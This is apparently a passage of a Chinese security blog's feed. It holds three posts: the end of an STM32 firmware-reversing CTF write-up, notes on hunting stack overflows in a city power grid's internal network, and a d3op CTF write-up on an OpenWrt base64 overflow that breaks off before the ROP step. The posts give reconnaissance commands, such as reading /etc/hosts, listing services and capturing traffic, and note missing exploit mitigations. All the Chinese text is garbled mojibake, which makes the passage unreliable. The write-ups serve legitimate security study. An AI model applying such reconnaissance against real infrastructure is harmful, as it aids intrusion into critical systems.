align="center">ä¸€èˆ¬ä¸ºhexæ–‡ä»¶æœ€åä¸€è¡Œï¼Œä»£è¡¨æ–‡ä»¶ç»“æŸ</td><td align="center">:00000001FF</td></tr><tr><td align="center">02</td><td align="center">æ‰©å±•åˆ†æ®µåœ°å€</td><td align="center">byte countå›ºå®šä¸º02ï¼Œèµ·å§‹åœ°å€ä¸ºdataæ®µå€¼ä¹˜ä»¥16</td><td align="center">:020000021200EA</td></tr><tr><td align="center">03</td><td align="center">å¼€å§‹æ®µåœ°å€</td><td align="center">å¯¹äº8086å¤„ç†å™¨æŒ‡å®šèµ·å§‹æ‰§è¡Œåœ°å€</td><td align="center">:0400000300003800C1</td></tr><tr><td align="center">04</td><td align="center">æ‰©å±•çº¿æ€§åœ°å€</td><td align="center">dataæ®µä»£è¡¨èµ·å§‹åœ°å€çš„é«˜16ä½</td><td align="center">:020000040800F2</td></tr><tr><td align="center">05</td><td align="center">èµ·å§‹çº¿æ€§åœ°å€</td><td align="center">dataè¡¨ç¤ºå¤§ç«¯çš„32ä½åœ°å€</td><td align="center">:04000005000000CD2A</td></tr></tbody></table><p>é’ˆå¯¹æœ¬é¢˜çš„èµ·å§‹æ•°æ®ä¸º<code>:020000040800F2</code>ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ç±»å‹ä¸º04ï¼Œåˆ™å¯ä»¥è®¡ç®—å‡ºå¯¹åº”åœ°å€ä¸º<strong>0x08000000</strong></p><h3 id="æŸ¥çœ‹å†…å­˜æ˜ å°„"><a href="#æŸ¥çœ‹å†…å­˜æ˜ å°„" class="headerlink" title="æŸ¥çœ‹å†…å­˜æ˜ å°„"></a>æŸ¥çœ‹å†…å­˜æ˜ å°„</h3><p>åœ¨ä¸Šé¢çš„datasheetç½‘ç«™ä¸­å¯ä»¥æœç´¢åˆ°ï¼š<a href="https://pdf1.alldatasheet.com/datasheet-pdf/view/201596/STMICROELECTRONICS/STM32F103C8T6.html">STM32F103C8T6 Datasheet</a>æœ¬é¢˜å¯¹åº”çš„datasheetï¼ŒæŸ¥çœ‹memory mappingç« èŠ‚å¯ä»¥å¾—åˆ°ä¸‹å›¾ã€‚</p><p><img src="/img/article/stm32/image-20230711195206201.png" alt="memory maping"></p><p>ä»å›¾ä¸­ä¹Ÿå¯ä»¥æ¯”è¾ƒç›´è§‚çš„æ‰¾åˆ°flashæ®µçš„åœ°å€åœ¨0x08000000ï¼Œæ­¤å¤–è¿˜å¯ä»¥çœ‹åˆ°ä¸€äº›å¤–è®¾çš„åœ°å€æ®µPERIPHERALSï¼Œè¿™ä¹Ÿæ˜¯åé¢åˆ†ææ—¶è¦è€ƒè™‘çš„ã€‚</p><h2 id="IDAåˆ†æ"><a href="#IDAåˆ†æ" class="headerlink" title="IDAåˆ†æ"></a>IDAåˆ†æ</h2><p>å°†hexæ–‡ä»¶æ‹–å…¥IDAåï¼Œé¦–å…ˆè®¾ç½®<strong>process type</strong>ä¸ºå°ç«¯ï¼Œç„¶åè®¾ç½®æ¶æ„ä¸º<strong>arm-v7</strong>ï¼ˆè¿™ä¸ªå¯ä»¥åœ¨æ‰‹å†Œä¸­æŸ¥åˆ°ï¼‰ï¼Œå¦‚å›¾ï¼š</p><p><img src="/img/article/stm32/image-20230712092047827.png" alt="set type"></p><p>è·Ÿè¸ªæµç¨‹å¯ä»¥è·Ÿåˆ°<code>sub_8000428</code>ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šå…¶å°±æ˜¯ä¸»å‡½æ•°<code>main</code>ï¼Œçº¢è‰²åŒºåŸŸåœ°å€æ˜¯å› ä¸ºIDAæ²¡æœ‰åŠ è½½è¿™ä¸ªåœ°å€çš„æ®µã€‚</p><p><img src="/img/article/stm32/image-20230712095333876.png" alt="preview"></p><p>å¯¹ç…§å†…å­˜æ˜ å°„å›¾ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™äº›0x40000000çš„åœ°å€å±äºå¤–è®¾çš„åœ°å€æ˜ å°„ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”äº†ä¸åŒçš„é’ˆè„šã€‚å¯ä»¥åœ¨Edit -&gt; Segment -&gt; create segmentï¼Œæ‰‹åŠ¨æ·»åŠ sramå’Œperipheralsæ®µå³å¯ï¼Œå†æ¬¡F5å³å¯çœ‹åˆ°åŒºåŸŸå˜ä¸ºæ­£å¸¸é»„è‰²ã€‚</p><p>æ¥ä¸‹æ¥å°±éœ€è¦æ‰‹åŠ¨æŸ¥é˜…æ‰‹å†Œï¼Œä¸ºæ¯ä¸ªåœ°å€æ”¹å˜é‡åä¸ºè®¾å¤‡åç§°ï¼Œæ–¹ä¾¿åç»­åˆ†æï¼Œåœ¨æˆ‘çœ‹æ¥è¿™ä¹Ÿæ˜¯æœ€è€—æ—¶æœ€éº»çƒ¦çš„ä¸€æ­¥ã€‚ä½†å…¶å¦‚æœä½¿ç”¨Ghidraå’ŒSVD-loaderæ’ä»¶ä¼šå¿«å¾ˆå¤šï¼Œå¯ä»¥ç›´æ¥è‡ªåŠ¨è¯†åˆ«æ›´æ”¹ï¼Œä½†æˆ‘åœ¨å°è¯•çš„æ—¶å€™æ²¡æœ‰æˆåŠŸï¼Œä¸çŸ¥ä»€ä¹ˆåŸå› ï¼Œæ‚² :(</p><p>æ”¹å®Œå·®ä¸å¤šå°±æ˜¯è¿™ä¸ªæ ·å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init((<span class="hljs-type">int</span>)&amp;loc_8000428 + <span class="hljs-number">1</span>, (<span class="hljs-type">int</span>)argv);<br>  RCC_APB2ENR = <span class="hljs-number">0x4005</span>;<br>  RCC_AHBENR = <span class="hljs-number">1</span>;<br>  PA_CRL = <span class="hljs-number">0x44488884</span>;<br>  PA_CRH = <span class="hljs-number">0x444444B4</span>;<br>  PA_ODR = <span class="hljs-number">0x1E</span>;<br>  EXTI_IMR = <span class="hljs-number">0x1E</span>;<br>  EXTI_FTSR = <span class="hljs-number">0x1E</span>;<br>  AFIO_EXTICR2 = <span class="hljs-number">0</span>;<br>  AFIO_EXTICR3 = <span class="hljs-number">0</span>;<br>  unkown(<span class="hljs-number">7</span>);<br>  unkown(<span class="hljs-number">8</span>);<br>  unkown(<span class="hljs-number">9</span>);<br>  unkown(<span class="hljs-number">10</span>);<br>  RCC_APB2RSTR |= <span class="hljs-number">0x4000</span>u;<br>  RCC_APB2RSTR &amp;= <span class="hljs-number">0xFFFFBFFF</span>;<br>  USART1_BRR = <span class="hljs-number">0x271</span>;<br>  USART1_CR1 = <span class="hljs-number">0x2008</span>;<br>  USART1_SEND(<span class="hljs-string">&#x27;S&#x27;</span>);<br>  USART1_SEND(<span class="hljs-string">&#x27;C&#x27;</span>);<br>  USART1_SEND(<span class="hljs-string">&#x27;T&#x27;</span>);<br>  USART1_SEND(<span class="hljs-string">&#x27;F&#x27;</span>);<br>  USART1_SEND(<span class="hljs-string">&#x27;&#123;&#x27;</span>);<br>  USART1_CR3 = <span class="hljs-number">0x80</span>;<br>  DMA_CMAR4 = <span class="hljs-number">0x20000000</span>;<br>  DMA_CPAR4 = &amp;USART_DR;<br>  DMA_CNDTR4 = <span class="hljs-number">0x1E</span>;<br>  DMA_CCR4 = <span class="hljs-number">0x492</span>;<br>  unkown(<span class="hljs-number">14</span>);<br>  EXTI_SWIER |= <span class="hljs-number">2u</span>;<br>  delay(<span class="hljs-number">1</span>);<br>  EXTI_SWIER |= <span class="hljs-number">0x10</span>u;<br>  delay(<span class="hljs-number">1</span>);<br>  EXTI_SWIER |= <span class="hljs-number">0x10</span>u;<br>  delay(<span class="hljs-number">1</span>);<br>  EXTI_SWIER |= <span class="hljs-number">4u</span>;<br>  delay(<span class="hljs-number">1</span>);<br>  EXTI_SWIER |= <span class="hljs-number">0x10</span>u;<br>  delay(<span class="hljs-number">1</span>);<br>  EXTI_SWIER |= <span class="hljs-number">2u</span>;<br>  delay(<span class="hljs-number">1</span>);<br>  EXTI_SWIER |= <span class="hljs-number">8u</span>;<br>  delay(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    ;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦å¤–è¿˜è¦å¯¹ä¸­æ–­å‘é‡è¡¨åšå¤„ç†ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹IDA pythonè„šæœ¬æ›´æ”¹æ®µä¸ºdword</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x8000000</span>,<span class="hljs-number">0x80000eb</span>,<span class="hljs-number">1</span>):del_items(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x8000000</span>,<span class="hljs-number">0x80000eb</span>,<span class="hljs-number">4</span>):create_dword(i)<br></code></pre></td></tr></table></figure><p><img src="/img/article/stm32/image-20230712101949569.png" alt="vector"></p><p>å›¾é‡Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºå­˜åœ¨ä¸€äº›å‡½æ•°ï¼ŒæŸ¥é˜…æ‰‹å†Œå¯ä»¥æ‰¾åˆ°å…¶ä¸ºä¸­æ–­å¤„ç†çš„EXTIå‡½æ•°</p><h2 id="å‡½æ•°é€»è¾‘åˆ†æ"><a href="#å‡½æ•°é€»è¾‘åˆ†æ" class="headerlink" title="å‡½æ•°é€»è¾‘åˆ†æ"></a>å‡½æ•°é€»è¾‘åˆ†æ</h2><p>è¿™æ¡ä¹Ÿæ²¡ä»€ä¹ˆæ·å¾„å¯èµ°ï¼Œéœ€è¦ä¸€è¾¹æŸ¥æ‰‹å†Œä¸€è¾¹çœ‹mianå‡½æ•°å†…çš„æ¯ä¸€æ­¥èµ‹å€¼å’Œå‡½æ•°çš„æ„ä¹‰ï¼ŒåŸºæœ¬ç»è¿‡è¿™ä¸ªæµç¨‹å¯ä»¥ææ¸…æ¥šGPIOã€EXTIã€USARTè¿™äº›ä½œç”¨ä¹‹ç±»çš„</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æŸå¸‚ç”µç½‘æ¼æ´æŒ–æ˜å°è®°</title>
    <link href="/2023/07/10/%E6%9F%90%E5%B8%82%E7%94%B5%E7%BD%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0/"/>
    <url>/2023/07/10/%E6%9F%90%E5%B8%82%E7%94%B5%E7%BD%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>ç”±äºç”µç½‘è®¾æ–½ä¿æŠ¤éå¸¸ä¸¥æ ¼ï¼Œæ•´ä¸ªç½‘ç»œæ‹“æ‰‘ä¹Ÿå¼‚å¸¸å¤æ‚ï¼Œè¯´å®è¯å‰ä¸¤å¤©ä¸€ç›´åœ¨æ¢³ç†æ•´ä¸ªä½“ç³»æ¶æ„ï¼ˆåæ¥å‘ç°å®Œå…¨æ²¡å¿…è¦ï¼‰ã€‚æ•´æ•´4å¤©ï¼Œæ‰¾åˆ°ä¸¤ä¸ªæ ˆæº¢å‡ºï¼Œä½†éƒ½æ²¡æ³•åˆ©ç”¨ï¼Œåªå¥½æŒ‰DOSäº¤äº†ã€‚æ®æˆ‘äº†è§£ï¼Œä»å¤–ç½‘è¿›å…¥å†…éƒ¨ç½‘ç»œçš„å¯èƒ½æ€§å‡ ä¹æ²¡æœ‰ï¼Œå®é™…æ¼æŒ–ä¹Ÿæ˜¯éœ€è¦çº¿ä¸‹ç½‘çº¿æ¥å…¥äº¤æ¢æœºã€‚</p><blockquote><p> è¯´å®è¯æˆ‘ä¹Ÿä¸çŸ¥é“è¿™ç§å†…ç½‘æ¼æ´çš„æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Œæ„Ÿè§‰åƒæ˜¯å®¡æ½œåœ¨ä»£ç BUG</p></blockquote><h2 id="æ¥å…¥è®¾å¤‡"><a href="#æ¥å…¥è®¾å¤‡" class="headerlink" title="æ¥å…¥è®¾å¤‡"></a>æ¥å…¥è®¾å¤‡</h2><p>é¦–å…ˆå°±æ˜¯æ¥å…¥äº¤æ¢æœºç„¶åsshä¸ŠæœåŠ¡å™¨ï¼Œä¸è¿‡æ¥å…¥çš„æ—¶å€™æ˜¯ä¸èƒ½å¼€å¯wifiï¼Œä¸èƒ½è¿æ¥å…¶ä»–ç½‘ç»œï¼Œä¸ç„¶ç›‘ç®¡ç³»ç»Ÿä¼šä¸€ç›´æŠ¥è­¦ğŸ‘®ğŸ‘®ğŸ‘®</p><p>sshä¸Šå»ä¹‹åçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯çœ‹çœ‹å†…ç½‘çš„æ‰€æœ‰æœºå™¨ä»¥åŠå¯¹åº”IPï¼Œä»¥æ­¤ç¡®å®šä»å“ªå°æœºå­çš„æœåŠ¡å…¥æ‰‹è¿›è¡Œæ¼æŒ–ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cat</span> /etc/hosts <span class="hljs-comment">#æŸ¥çœ‹ä¸åŒè®¾å¤‡åŠå¯¹åº”IP</span><br></code></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯æŸ¥çœ‹è¯¥è®¾å¤‡æœ‰å“ªäº›æœåŠ¡æ˜¯å¼€å¯çš„</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">netstat -tulnp <span class="hljs-comment">#æŸ¥çœ‹æ‰€æœ‰çš„TCP/UDPè¿›ç¨‹</span><br><span class="hljs-comment"># -t ä¸ºTCP -uä¸ºUDP</span><br><br><span class="hljs-comment">#ä¸‹é¢ä¸¤ä¸ªæŒ‡ä»¤éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾ç¨‹åºè·¯å¾„</span><br>ps - ef <span class="hljs-comment">#æŸ¥çœ‹è¿›ç¨‹</span><br>whereis/which &lt;name&gt; <br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°å¯¹åº”å¯èƒ½å­˜åœ¨æ¼æ´çš„ç¨‹åºåï¼Œå°±å¯ä»¥<code>scp</code>æ‹·è´åˆ°æœ¬æœºï¼Œç„¶åIDAé€†å‘åˆ†æäº†</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">scp name@127.0.0.1:&lt;remote path&gt; &lt;<span class="hljs-built_in">local</span> path&gt;<br></code></pre></td></tr></table></figure><h2 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h2><blockquote><p>è™½ç„¶æ–°ç³»ç»Ÿä»å®‰å…¨è§’åº¦è€ƒè™‘ä¸ä¼šå°†æºç äº¤ç»™æˆ‘ä»¬ã€‚ä½†æˆ‘ç›®å‰æ¥è§¦åˆ°çš„ç³»ç»Ÿä¼¼ä¹æœªå¯¹ç¨‹åºè¿›è¡Œä»»ä½•æ··æ·†ã€åŠ å£³æˆ–è€…é˜»ç¢åæ±‡ç¼–çš„è¡Œä¸ºï¼Œç”šè‡³å˜é‡çš„ç¬¦å·è¡¨éƒ½æ˜¯å­˜åœ¨çš„ã€‚é€†å‘èµ·æ¥éå¸¸èˆ’é€‚ï¼Œè·Ÿç›´æ¥å®¡æºç åŒºåˆ«ä¹Ÿä¸å¤§ã€‚</p></blockquote><p>ç”±äºè¿™äº›æœåŠ¡å¤§å¤šéƒ½æ˜¯æ ‡å‡†çš„C&#x2F;Sç»“æ„ï¼Œé‚£ä¹ˆåˆ†æçš„å…³é”®å…¥å£ç‚¹å°±æ˜¯æ‰¾åˆ°<code>recv</code>, <code>recvfrom</code>, <code>read</code>è¿™æ ·çš„æ¥æ”¶æ•°æ®çš„å‡½æ•°ã€‚å½“ç„¶ä»–ä»¬çš„æ¥æ”¶å‡½æ•°å¾€å¾€éƒ½æ˜¯è‡ªè¡Œå°è£…åçš„ï¼Œç›´æ¥æœç´¢å‡½æ•°ä¸ä¸€å®šä¼šæœ‰ç»“æœã€‚</p><p>æ‰¾åˆ°æ¥æ”¶å‡½æ•°ä¹‹åï¼Œå°±æ˜¯åˆ†ææŠ¥æ–‡ç»“æ„äº†ã€‚ç”±äºè¿™äº›ç¨‹åºçš„é€šä¿¡éƒ½æœ‰ä¸€å¥—ç¬¦åˆè‡ªèº«æ ‡å‡†çš„æŠ¥æ–‡æ ¼å¼ï¼Œç†Ÿæ‚‰å¯¹åº”çš„æ ¼å¼ï¼Œå¯ä»¥æ›´å¿«é€Ÿçš„ç†è§£åç»­çš„æŠ¥æ–‡å¤„ç†partã€‚</p><p>åŸºæœ¬æ‰€æœ‰çš„æŠ¥æ–‡ç»“æ„éƒ½å¯ä»¥ç”¨<strong>header + body</strong>æ¦‚å†µï¼Œå…³é”®ä¾¿æ˜¯ç†è§£<strong>header</strong>ä¸­å„ä¸ªå­—æ®µçš„å«ä¹‰ã€‚è¿™é‡Œçš„æŠ¥æ–‡åˆ†æå¯ä»¥ä»ä¸¤ä¸ªè§’åº¦è¿›è¡Œå¤„ç†ï¼š</p><ul><li>ç”±äºå·²ç»è¿å…¥å†…ç½‘ï¼Œå¯ä»¥ç›´æ¥ç”¨tcpdumpæŠ“å–æŠ¥æ–‡é…åˆwiresharkè¿›è¡Œåˆ†æ</li><li>å¯ä»¥ç›´æ¥ä½¿ç”¨IDA PROä»å¤„ç†æµç¨‹çš„è§’åº¦é€†å‘åˆ†æ</li></ul><p>ä¸Šè¿°ä¸¤è€…ç›¸äº’é…åˆæ•ˆæœä¼šå¥½å¾ˆå¤š</p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">tcpdump -i any -n tcp port 9999 -w /tmp/123.<span class="hljs-built_in">cap</span> <span class="hljs-comment">#æŠ“å–TCPåŒ…</span><br>tcpdump -i any -n udp port 9999 -w /tmp/123.<span class="hljs-built_in">cap</span> <span class="hljs-comment">#æŠ“å–UDPåŒ…</span><br></code></pre></td></tr></table></figure><p>ç”¨ä¸Šè¿°å‘½ä»¤ä¿å­˜æŠ“åˆ°çš„åŒ…åï¼Œscpåˆ°æœ¬æœºç”¨wiresharkåˆ†æå³å¯</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>åœ¨æŒ–æ´çš„æ—¶å€™æˆ‘æ³¨æ„åˆ°ï¼Œå‡ ä¹æ‰€æœ‰çš„è®¾å¤‡éƒ½æ˜¯é‡‡ç”¨å›½äº§çš„linuxæŸç³»ç»Ÿã€‚ä¸å¤ªæ¸…æ¥šæ˜¯è¯¥ç³»ç»Ÿä¸€ç›´æœªæ›´æ–°çš„ç¼˜æ•…è¿˜æ˜¯gccæœªæ›´æ–°çš„ç¼˜æ•…ï¼Œè®¾å¤‡ä¸Šæ‰€æœ‰çš„æœåŠ¡éƒ½æ²¡æœ‰<strong>canary</strong>å’Œ<strong>PIE</strong>é˜²æŠ¤ã€‚è¿™åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šé™ä½äº†æ¼æ´åˆ©ç”¨çš„éš¾åº¦ï¼Œä½¿å¾—åŸºäºäºŒè¿›åˆ¶æ¼æ´çš„RCEæ›´å®¹æ˜“å®ç°ã€‚</p><p><img src="/img/article/dig1/image-20230710154558220.png" alt="image-20230710154558220"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€WPã€‘AntCTFxD3^CTF d3op</title>
    <link href="/2023/05/16/%E3%80%90kernel%E3%80%91AntCTFxD3%5ECTF%20d3op%20WP/"/>
    <url>/2023/05/16/%E3%80%90kernel%E3%80%91AntCTFxD3%5ECTF%20d3op%20WP/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡é‡‡å–æ ¹æ®å®˜æ–¹wpçš„æ–¹å¼è¿›è¡Œå¤ç°ï¼Œéœ€è¦å®˜æ–¹WPçš„pdfæ–‡ä»¶ä¹Ÿå¯ä»¥åœ¨è¯„è®ºåŒºç•™è¨€ï¼ˆä¾µåˆ ï¼‰</p></blockquote><h2 id="æ–‡ä»¶ç³»ç»Ÿåˆ†æ"><a href="#æ–‡ä»¶ç³»ç»Ÿåˆ†æ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿåˆ†æ"></a>æ–‡ä»¶ç³»ç»Ÿåˆ†æ</h2><p>é¦–å…ˆè§£å‹æ–‡ä»¶ç³»ç»Ÿ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> rootfs<br><span class="hljs-built_in">cd</span> rootfs<br>unsquashfs ../unsquashfs ../squashfs-root.img  <br></code></pre></td></tr></table></figure><p>åœ¨<code>etc/os-release</code>ä¸­æˆ‘ä»¬èƒ½çœ‹åˆ°ç‰ˆæœ¬ä¿¡æ¯</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">NAME</span>=<span class="hljs-string">&quot;OpenWrt&quot;</span><br><span class="hljs-attr">VERSION</span>=<span class="hljs-string">&quot;22.03.3&quot;</span><br><span class="hljs-attr">ID</span>=<span class="hljs-string">&quot;openwrt&quot;</span><br><span class="hljs-attr">ID_LIKE</span>=<span class="hljs-string">&quot;lede openwrt&quot;</span><br><span class="hljs-attr">PRETTY_NAME</span>=<span class="hljs-string">&quot;OpenWrt 22.03.3&quot;</span><br><span class="hljs-attr">VERSION_ID</span>=<span class="hljs-string">&quot;22.03.3&quot;</span><br><span class="hljs-attr">HOME_URL</span>=<span class="hljs-string">&quot;https://openwrt.org/&quot;</span><br><span class="hljs-attr">BUG_URL</span>=<span class="hljs-string">&quot;https://bugs.openwrt.org/&quot;</span><br><span class="hljs-attr">SUPPORT_URL</span>=<span class="hljs-string">&quot;https://forum.openwrt.org/&quot;</span><br><span class="hljs-attr">BUILD_ID</span>=<span class="hljs-string">&quot;r20028-43d71ad93e&quot;</span><br><span class="hljs-attr">OPENWRT_BOARD</span>=<span class="hljs-string">&quot;armvirt/64&quot;</span><br><span class="hljs-attr">OPENWRT_ARCH</span>=<span class="hljs-string">&quot;aarch64_cortex-a53&quot;</span><br><span class="hljs-attr">OPENWRT_TAINTS</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attr">OPENWRT_DEVICE_MANUFACTURER</span>=<span class="hljs-string">&quot;OpenWrt&quot;</span><br><span class="hljs-attr">OPENWRT_DEVICE_MANUFACTURER_URL</span>=<span class="hljs-string">&quot;https://openwrt.org/&quot;</span><br><span class="hljs-attr">OPENWRT_DEVICE_PRODUCT</span>=<span class="hljs-string">&quot;Generic&quot;</span><br><span class="hljs-attr">OPENWRT_DEVICE_REVISION</span>=<span class="hljs-string">&quot;v0&quot;</span><br><span class="hljs-attr">OPENWRT_RELEASE</span>=<span class="hljs-string">&quot;OpenWrt 22.03.3 r20028-43d71ad93e&quot;</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®é¢˜ç›®æç¤º<code>May be you need to do a diff with the rootfs in attachment.</code>ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶ä¸­çš„å…³é”®è¯ï¼Œä»openwrtä¸­æœç´¢åˆ°å®˜æ–¹çš„æ–‡ä»¶ç³»ç»Ÿï¼Œè§£å‹åè¿›è¡Œdiffæ¯”è¾ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> rootfs<br>unsquashfs ../openwrt-22.03.3-armvirt-64-rootfs-squashfs.img<br>diff -r squashfs-root squashfs-root-d3op <br></code></pre></td></tr></table></figure><p>å¯å¾—å¦‚ä¸‹å›¾ç»“æœ</p><p><img src="/img/article/d3op/image-20230507175322524.png" alt="image-20230507175322524"></p><p>å¯ä»¥çœ‹åˆ°é¢˜ç›®çš„æ–‡ä»¶ç³»ç»Ÿå¤šäº†å¯¹äºŒè¿›åˆ¶æ–‡ä»¶base64ï¼Œä»¥åŠå…¶å¯¹åº”çš„ubusçš„rpcæ¥å£ï¼Œä¸”è¿™ä¸ªæ¥å£å¯ä»¥æœªç»èº«ä»½éªŒè¯è®¿é—®ã€‚</p><blockquote><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æœ¬æœºçš„127.0.0.1:9999æŸ¥çœ‹è·¯ç”±å™¨çš„ç™»å½•å…¥å£ï¼Œå…¸å‹IOT</p></blockquote><h2 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h2><p>ç¨‹åºæ˜¯å»ç¬¦å·è¡¨çš„ï¼Œä¸è¿‡ç®€å•é€†å‘å°±èƒ½çœ‹å‡ºå…¶é€»è¾‘ï¼Œä¸»å‡½æ•°å¦‚ä¸‹</p><p><img src="/img/article/d3op/image-20230512143723652.png" alt="image-20230512143723652"></p><p>å¯æ ¹æ®argvçš„å‚æ•°å†³å®šè¾“å‡ºï¼Œæ¯”å¦‚å‚æ•°ä¸º<code>list</code>å³å¯è¾“å‡ºæ ¼å¼ï¼Œ<code>call</code>ä¼šè°ƒç”¨<code>decode</code>æˆ–è€…<code>encode</code>å‡½æ•°ï¼Œè·Ÿè¿›å‡½æ•°<code>sub_4064f0</code>å¯ä»¥çœ‹åˆ°å¦‚ä¸‹æ¯”è¾ƒæ˜æ˜¾çš„æ¡†æ¶ï¼š</p><p><img src="/img/article/d3op/image-20230512144108981.png" alt="image-20230512144108981"></p><p>æ¼æ´ç‚¹åœ¨<code>decode</code>å‡½æ•°å½“ä¸­ï¼Œè§‚å¯Ÿå¦‚ä¸‹ä¸¤ä¸ªéƒ¨åˆ†</p><p><img src="/img/article/d3op/image-20230512144314406.png" alt="image-20230512144314406"></p><p><img src="/img/article/d3op/image-20230512144326907.png" alt="image-20230512144326907"></p><p>å¯ä»¥çœ‹åˆ°<code>decode</code>å‡½æ•°é€šè¿‡è®¡ç®—å‡º<code>output_len</code>ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºé•¿åº¦ï¼Œå…ˆå‘<code>v16</code>ä¸­èµ‹å€¼è§£ç å¥½çš„æ•°æ®ï¼Œç„¶åæ•´ä¸ªæ‹·è´è¿›å…¥<code>a2</code>å½“ä¸­ã€‚</p><p>ä½†åœ¨<code>main</code>å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬çš„è¯»å…¥æ˜¯4095ï¼Œè€Œè¿™é‡Œå¹¶æ²¡æœ‰æ£€æµ‹v16çš„é•¿åº¦ï¼Œå¯¼è‡´v16ä½œä¸ºä¸€ä¸ªä¸­é—´é‡å‡ºç°æº¢å‡ºã€‚</p><p><img src="/img/article/d3op/image-20230512144619845.png" alt="image-20230512144619845"></p><p>æ­¤æ—¶çœ‹ä¸€çœ¼<code>base64</code>äºŒè¿›åˆ¶ç¨‹åºçš„ä¿æŠ¤ï¼Œå‘ç°åªæœ‰NXï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥æº¢å‡ºæ„é€ ROPäº†</p><p><img src="/img/article/d3op/image-20230512144804176.png" alt="image-20230512144804176"></p><h2 